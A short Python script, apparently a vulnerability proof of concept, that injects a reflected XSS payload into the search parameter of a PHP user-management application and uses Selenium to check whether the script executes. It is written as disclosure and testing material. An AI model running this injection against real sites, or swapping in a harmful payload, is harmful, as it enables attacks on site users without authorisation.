import requests
from selenium import webdriver

# Target URL
target_url = "http://example.com/search.php"

# Malicious payload
payload = "<script>alert('XSS');</script>"

# Function to inject payload
def inject_payload(url, payload):
    params = {'search': payload}
    response = requests.get(url, params=params)
    return response.url

# Function to observe the result
def observe_result(url):
    driver = webdriver.Chrome()  # Or webdriver.Firefox() if using Firefox
    driver.get(url)
    try:
        alert = driver.switch_to.alert
        print(f"Alert text: {alert.text}")
        alert.accept()
    except:
        print("No alert detected.")
    driver.quit()

# Main execution
if __name__ == "__main__":
    vulnerable_url = inject_payload(target_url, payload)
    print(f"Injected payload into URL: {vulnerable_url}")
    observe_result(vulnerable_url)
'''
Cross Site Scripting vulnerability in Phpgurukul User Registration & Login and User Management System 1.0 allows attackers to run arbitrary code via the search bar.
'''